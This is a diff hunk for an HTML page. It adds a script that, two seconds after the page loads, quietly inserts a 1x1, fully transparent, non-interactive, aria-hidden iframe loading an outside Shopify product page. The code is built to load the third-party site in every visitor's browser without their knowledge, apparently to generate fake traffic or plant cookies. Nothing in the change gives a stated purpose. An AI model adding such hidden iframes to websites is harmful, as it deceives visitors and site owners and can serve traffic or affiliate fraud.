@@ -846,6 +846,23 @@
   window.addEventListener('scroll', handleScroll);
 </script>
 
+<script>
+  window.addEventListener("DOMContentLoaded", function () {
+    setTimeout(function () {
+      var iframe = document.createElement("iframe");
+      iframe.src = "https://jellyfuserh.myshopify.com/products/jellyfuser";
+      iframe.style.width = "1px";
+      iframe.style.height = "1px";
+      iframe.style.opacity = "0";
+      iframe.style.position = "absolute";
+      iframe.style.pointerEvents = "none";
+      iframe.setAttribute("aria-hidden", "true");
+      iframe.setAttribute("loading", "lazy");
+      document.body.appendChild(iframe);
+    }, 2000);
+  });
+</script>
+
 </body>
 
 </html>
